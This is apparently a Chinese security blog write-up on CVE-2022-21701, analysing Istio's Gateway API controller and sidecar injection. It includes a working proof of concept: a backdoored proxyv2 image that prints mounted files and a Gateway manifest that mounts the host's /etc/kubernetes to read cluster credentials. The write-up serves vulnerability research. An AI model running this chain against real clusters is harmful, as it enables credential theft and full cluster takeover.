#  利用gateway-api，我支配了kubernetes | 高级攻防05

[ 酒仙桥六号部队 ](javascript:void\(0\);)

**酒仙桥六号部队** ![]()

微信号 anfu-360

功能介绍 知其黑，守其白。 分享知识盛宴，闲聊大院趣事，备好酒肉等你！

____

__

收录于话题 #高级攻防 5个

![](https://gitee.com/fuli009/images/raw/master/public/20220413190811.png)  
![](https://gitee.com/fuli009/images/raw/master/public/20220413190829.png)本文约7000字，阅读约需12分钟。  

# 前几天注意到了Istio官方公告，有一个利用kubernetes gateway
api仅有CREATE权限来完成特权提升的漏洞(CVE-2022-21701)。  

  
看公告，Diff patch也没看出什么名堂来。跟着自己感觉，猜测了一下利用方法。  
实际跟下来，发现涉及到了sidecar注入原理及depolyments传递注解的特性，个人觉得还是比较有趣，所以记录一下。  
不过有个插曲，复现后，发现这条利用链可以在已经修复的版本上利用，于是和Istio
security团队进行了友好的沟通，最终发现小丑竟是我自己——自己构思的利用只是官方文档一笔带过的一个feature。  
所以通篇权当一个controller的攻击面，还有一些好玩的特性科普文看就好。  
 **1**  
 **Istio sidecar injection**  
Istio可以通过用namespace打label的方法，自动给对应的namespace中运行的pod注入sidecar容器。而另一种方法则是在pod的annotations中，手动地增加sidecar.istio.io/inject:
"true"注解。  
当然还可以借助istioctl kube-
inject，对yaml手动进行注入。前两个功能都要归功于kubernetes动态准入控制的设计，它允许用户在不同的阶段，对提交上来的资源进行修改和审查。  
动态准入控制流程:  
![](https://gitee.com/fuli009/images/raw/master/public/20220413190830.png)  
Istiod创建了MutatingWebhook，并且一般对namespace label为istio-injection:
enabled及sidecar.istio.io/inject != flase的pod资源创建请求做Mutaing webhook。  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    apiVersion: admissionregistration.k8s.io/v1kind: MutatingWebhookConfigurationmetadata:  name: istio-sidecar-injectorwebhooks:[...]  namespaceSelector:    matchExpressions:    - key: istio-injection      operator: In      values:      - enabled  objectSelector:    matchExpressions:    - key: sidecar.istio.io/inject      operator: NotIn      values:      - "false"[...]  rules:  - apiGroups:    - ""    apiVersions:    - v1    operations:    - CREATE    resources:    - pods    scope: '*' sideEffects: None timeoutSeconds: 10

  
当我们提交一个创建符合规定的pod资源的操作时，Istiod
webhook将会收到来自k8s动态准入控制器的请求，请求包含了AdmissionReview的资源。Istiod会对其中的pod资源的注解进行解析，在注入sidecar之前，会使用
：  

  * 

    
    
    injectRequired (pkg/kube/inject/inject.go:169)

  
这个函数对pod是否符合非hostNetwork、是否在默认忽略的namespace列表中、是否在annotation/label中带有sidecar.istio.io/inject注解进行判断。  
如果sidecar.istio.io/inject为true，则注入sidecar。另外一提，namepsace
label也能注入，是因为InjectionPolicy默认为Enabled：  
![](https://gitee.com/fuli009/images/raw/master/public/20220413190833.png)  
了解完上面的条件后，接着分析注入sidecar具体操作的代码。具体实现位于：  

  * 

    
    
    RunTemplate (pkg/kube/inject/inject.go:283)

  
前面的一些操作是合并config、做一些检查确保注解的规范及精简pod struct，注意力放到位于templatePod后的代码。  
  
利用selectTemplates函数，提取出需要渲染的templateNames，再经过parseTemplate进行渲染，详细的函数代码请看下方：  
![](https://gitee.com/fuli009/images/raw/master/public/20220413190835.png)  
获取注解inject.istio.io/templates中的值作为templateName，params.pod.Annotations数据类型是map[string]string
，一般常见值为sidecar或者gateway。  

  *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    func selectTemplates(params InjectionParameters) []string {    // annotation.InjectTemplates.Name = inject.istio.io/templates    if a, f := params.pod.Annotations[annotation.InjectTemplates.Name]; f {        names := []string{}        for _, tmplName := range strings.Split(a, ",") {            name := strings.TrimSpace(tmplName)            names = append(names, name)        }        return resolveAliases(params, names)    }    return resolveAliases(params, params.defaultTemplate)}  
    

  

使用go template模块来完成yaml文件的渲染：

  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    func parseTemplate(tmplStr string, funcMap map[string]interface{}, data SidecarTemplateData) (bytes.Buffer, error) {    var tmpl bytes.Buffer    temp := template.New("inject")    t, err := temp.Funcs(sprig.TxtFuncMap()).Funcs(funcMap).Parse(tmplStr)    if err != nil {        log.Infof("Failed to parse template: %v %v\n", err, tmplStr)        return bytes.Buffer{}, err    }    if err := t.Execute(&tmpl, &data); err != nil {        log.Infof("Invalid template: %v %v\n", err, tmplStr)        return bytes.Buffer{}, err    }  
      
        return tmpl, nil}

  
那么这个tmplStr到底来自何方呢？实际上，Istio在初始化时将其存储在configmap中，我们可以通过运行：  

  * 

    
    
    kubectl describe cm -n istio-system istio-sidecar-injector

  
来获取模版文件。sidecar的模版有一些点非常值得注意，很多敏感值都是取自annotation：  
![](https://gitee.com/fuli009/images/raw/master/public/20220413190836.png)![]()  
有经验的研究者看到下面userVolume就可以猜到，大概通过什么操作来完成攻击了。  

  *   *   * 

    
    
    sidecar.istio.io/proxyImagesidecar.istio.io/userVolumesidecar.istio.io/userVolumeMount

  
 **2**  
 **注解传递**  
分析官方公告里的缓解建议，其中有一条就是将：  

  * 

    
    
    PILOT_ENABLE_GATEWAY_API_DEPLOYMENT_CONTROLLER 

  
环境变量置为false ，然后结合另一条建议，对下面的crd做删除处理：  

  * 

    
    
    gateways.gateway.networking.k8s.io

  
所以大概率上，漏洞和创建gateways资源有关。翻了翻官方手册，注意到了这句话如下图所示：gateway资源的注解将会传递到Service及Deployment资源上。  
![](https://gitee.com/fuli009/images/raw/master/public/20220413190837.png)  
有了传递这个细节，我们就能对得上漏洞利用的条件了。需要具备：  

  * 

    
    
    gateways.gateway.networking.k8s.io

  
这个资源的CREATE权限。  
接着我们来分析一下，gateway是如何传递annotations和labels的。  
其实大概也能想到，还是利用go template对内置的template进行渲染，直接分析configureIstioGateway函数：  

  * 

    
    
    pilot/pkg/config/kube/gateway/deploymentcontroller.go

  
其主要功能就是把gateway需要创建的Service及Deployment，按照embed.FS中的模版进行一个渲染。模版文件可以在下面找到：  

  * 

    
    
    pilot/pkg/config/kube/gateway/templates/deployment.yaml

  
分析模版文件。也可以看到template中的annotations也是从上层的获取传递过来的注解。toYamlMap可以将maps进行合并，注意观察：  

  * 

    
    
    strdict "inject.istio.io/templates" "gateway"

  
位于.Annotations前，所以这个点，我们可以通过控制gateway的注解来覆盖templates值，选择渲染的模版。  
  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    apiVersion: apps/v1kind: Deploymentmetadata:  annotations:    {{ toYamlMap .Annotations | nindent 4 }}  labels:    {{ toYamlMap .Labels      (strdict "gateway.istio.io/managed" "istio.io-gateway-controller")      | nindent 4}}  name: {{.Name}}  namespace: {{.Namespace}}  ownerReferences:  - apiVersion: gateway.networking.k8s.io/v1alpha2    kind: Gateway    name: {{.Name}}    uid: {{.UID}}spec:  selector:    matchLabels:      istio.io/gateway-name: {{.Name}}  template:    metadata:      annotations:        {{ toYamlMap          (strdict "inject.istio.io/templates" "gateway")          .Annotations          | nindent 8}}      labels:        {{ toYamlMap          (strdict "sidecar.istio.io/inject" "true")          (strdict "istio.io/gateway-name" .Name)          .Labels          | nindent 8}}

  
 **3**  
 **漏洞利用**  
掌握了漏洞利用链路上的细节，我们就可以理出整个思路。创建精心构造过注解的gateway资源及恶意的proxyv2镜像，“迷惑”控制器创建非预期的pod，完成对Host主机上的敏感文件进行访问，如docker
unix socket。  
 **漏洞环境:**  

  *   *   * 

    
    
     istio v1.12.2kubernetes v1.20.14kubernetes gateway-api v0.4.0

  
用下面的命令创建一个write-only的角色，并初始化 Istio：  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    curl -L https://istio.io/downloadIstio | ISTIO_VERSION=1.12.2 TARGET_ARCH=x86_64 sh -istioctl x precheckistioctl install --set profile=demo -ykubectl create namespace istio-ingresskubectl create -f - << EOFapiVersion: rbac.authorization.k8s.io/v1kind: ClusterRolemetadata:  name: gateways-only-createrules:- apiGroups: ["gateway.networking.k8s.io"]  resources: ["gateways"]  verbs: ["create"]---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata:  name: test-gateways-only-createsubjects:- kind: User  name: test  apiGroup: rbac.authorization.k8s.ioroleRef:  kind: ClusterRole  name: gateways-only-create  apiGroup: rbac.authorization.k8s.ioEOF

  
在利用漏洞之前，我们需要先制作一个恶意的docker镜像。我这里直接选择了proxyv2镜像作为目标镜像，替换其中的/usr/local/bin/pilot-
agent为bash脚本，再tag一下，Push到本地的registry或者docker.io都可以。  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    docker run -it  --entrypoint /bin/sh istio/proxyv2:1.12.1cp /usr/local/bin/pilot-agent /usr/local/bin/pilot-agent-origcat << EOF > /usr/local/bin/pilot-agent#!/bin/bash  
    echo $1if [ $1 != "istio-iptables" ]then    touch /tmp/test/pwned    ls -lha /tmp/test/*    cat /tmp/test/*fi  
      
    /usr/local/bin/pilot-agent-orig $*EOFchmod +x /usr/local/bin/pilot-agentexitdocker tag 0e87xxxxcc5c xxxx/proxyv2:malicious

  
Commit之前，记得把image的entrypoint改为/usr/local/bin/pilot-
agent，接着利用下列的命令完成攻击，注意我覆盖了注解中的：  

  * 

    
    
    inject.istio.io/templates

  
这是为了sidecar使能让k8s controller在创建pod任务的时候，让其注解中的：  

  * 

    
    
    inject.istio.io/templates

  
也为sidecar，这样Istiod的inject webhook就会按照sidecar的模版进行渲染pod资源文件。  
sidecar.istio.io/userVolume和sidecar.istio.io/userVolumeMount，我这里挂载了/etc/kubernetes目录，为了和上面的恶意镜像相辅相成。  
POC的效果就是直接打印出Host中/etc/kubernetes目录下的凭证及配置文件，利用kubelet的凭证或者admin
token就可以提权完成，接管整个集群。当然你也可以挂载docker.sock可以做到更完整的利用。  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    kubectl --as test create -f - << EOFapiVersion: gateway.networking.k8s.io/v1alpha2kind: Gatewaymetadata:  name: gateway  namespace: istio-ingress  annotations:    inject.istio.io/templates: sidecar    sidecar.istio.io/proxyImage: docker.io/shtesla/proxyv2:malicious    sidecar.istio.io/userVolume: '[{"name":"kubernetes-dir","hostPath": {"path":"/etc/kubernetes","type":"Directory"}}]'    sidecar.istio.io/userVolumeMount: '[{"mountPath":"/tmp/test","name":"kubernetes-dir"}]'spec:  gatewayClassName: istio  listeners:  - name: default    hostname: "*.example.com"    port: 80    protocol: HTTP    allowedRoutes:      namespaces:        from: AllEOF

  
创建完gateway后，Istiod inject webhook也按照我们的要求创建了pod。  
![](https://gitee.com/fuli009/images/raw/master/public/20220413190839.png)![](https://gitee.com/fuli009/images/raw/master/public/20220413190840.png)  
Deployments最终被渲染如下:  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    apiVersion: apps/v1kind: Deploymentmetadata:  annotations:    deployment.kubernetes.io/revision: "1"    inject.istio.io/templates: sidecar    [...]    sidecar.istio.io/proxyImage: docker.io/shtesla/proxyv2:malicious    sidecar.istio.io/userVolume: '[{"name":"kubernetes-dir","hostPath": {"path":"/etc/kubernetes","type":"Directory"}}]'    sidecar.istio.io/userVolumeMount: '[{"mountPath":"/tmp/test","name":"kubernetes-dir"}]'  generation: 1  labels:    gateway.istio.io/managed: istio.io-gateway-controller  name: gateway  namespace: istio-ingressspec:  progressDeadlineSeconds: 600  replicas: 1  revisionHistoryLimit: 10  selector:    matchLabels:      istio.io/gateway-name: gateway  strategy:    rollingUpdate:      maxSurge: 25%      maxUnavailable: 25%    type: RollingUpdate  template:    metadata:      annotations:        inject.istio.io/templates: sidecar        [...]        sidecar.istio.io/proxyImage: docker.io/shtesla/proxyv2:malicious        sidecar.istio.io/userVolume: '[{"name":"kubernetes-dir","hostPath": {"path":"/etc/kubernetes","type":"Directory"}}]'        sidecar.istio.io/userVolumeMount: '[{"mountPath":"/tmp/test","name":"kubernetes-dir"}]'      creationTimestamp: null      labels:        istio.io/gateway-name: gateway        sidecar.istio.io/inject: "true"    spec:      containers:      - image: auto        imagePullPolicy: Always        name: istio-proxy        ports:        - containerPort: 15021          name: status-port          protocol: TCP        readinessProbe:          failureThreshold: 10          httpGet:            path: /healthz/ready            port: 15021            scheme: HTTP          periodSeconds: 2          successThreshold: 1          timeoutSeconds: 2        resources: {}        securityContext:          allowPrivilegeEscalation: true          capabilities:            add:            - NET_BIND_SERVICE            drop:            - ALL          readOnlyRootFilesystem: true          runAsGroup: 1337          runAsNonRoot: false          runAsUser: 0        terminationMessagePath: /dev/termination-log        terminationMessagePolicy: File      dnsPolicy: ClusterFirst      restartPolicy: Always      schedulerName: default-scheduler      securityContext: {}      terminationGracePeriodSeconds: 30

  
成功在/tmp/test目录下挂载kubernetes目录，可以看到apiserver的凭据。  
![](https://gitee.com/fuli009/images/raw/master/public/20220413190841.png)

##  

 **4**  
 **总结**  
虽然John Howard与我友好沟通时，反复询问我这和用户直接创建pod有何区别？但我觉得，整个利用过程，也不失为一种新的特权提升的方法。  
随着kubernetes各种新的api从SIG孵化出来，以及更多新的云原生组件加入进来，在上下文传递的过程中，难免会出现这种曲线救国，权限溢出的漏洞。  
我觉得，各种云原生的组件controller，也可以作为重点的审计对象。  
实战中，要说完全能复现这个漏洞的利用过程，可能不太现实。但希望此文可以为各位师傅提供相关场景的参考。在infra中，k8s声明式的api配合海量组件watch资源的变化引入了无限的可能，或许实战中，限定资源的读或者写，就可以转化成特权提升漏洞。  
 **5**  
 **参考链接**  

  *   *   *   * 

    
    
     https://gateway-api.sigs.k8s.io/https://istio.io/latest/docs/reference/config/annotations/https://istio.io/latest/news/security/istio-security-2022-002/https://istio.io/latest/docs/tasks/traffic-management/ingress/gateway-api/

  
  
\- END -  
  
往期推荐  
[![](https://gitee.com/fuli009/images/raw/master/public/20220413190844.png)](http://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247498468&idx=1&sn=1470091d2324f57ac96b2e3700fb44cb&chksm=9b3adc55ac4d5543bd24c441c82a17e9a4659c7db2382ba7d702adcf017ce6f4236a4b588ba3&scene=21#wechat_redirect)

Fake dnSpy - 这鸡汤里下了毒！

[![](https://gitee.com/fuli009/images/raw/master/public/20220413190845.png)](http://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247496937&idx=1&sn=606c737a7e587a1503bf67aeb5b850f2&chksm=9b3ad258ac4d5b4eb45e47ad062b60febe725c7aa1f7c9ac13b8d4d570539169e5c5ab66f2af&scene=21#wechat_redirect)

ADCS攻击面挖掘与利用

[![](https://gitee.com/fuli009/images/raw/master/public/20220413190846.png)](http://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247496171&idx=1&sn=5f903d0266a75ddaa04e4f4a1f3f8c4e&chksm=9b3ad75aac4d5e4c6cd0a9da7688345901d1a65518974927e23077aa9085db4572666e5c97d2&scene=21#wechat_redirect)

安全认证相关漏洞挖掘

长按下方图片即可
**关注**![](https://gitee.com/fuli009/images/raw/master/public/20220413190847.png)  
 **点击下方阅读原文，加入社群，读者作者无障碍交流** **读完有话想说？点击留言按钮，让上万读者听到你的声音！**

预览时标签不可点

收录于话题 #

 个

上一篇 下一篇

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

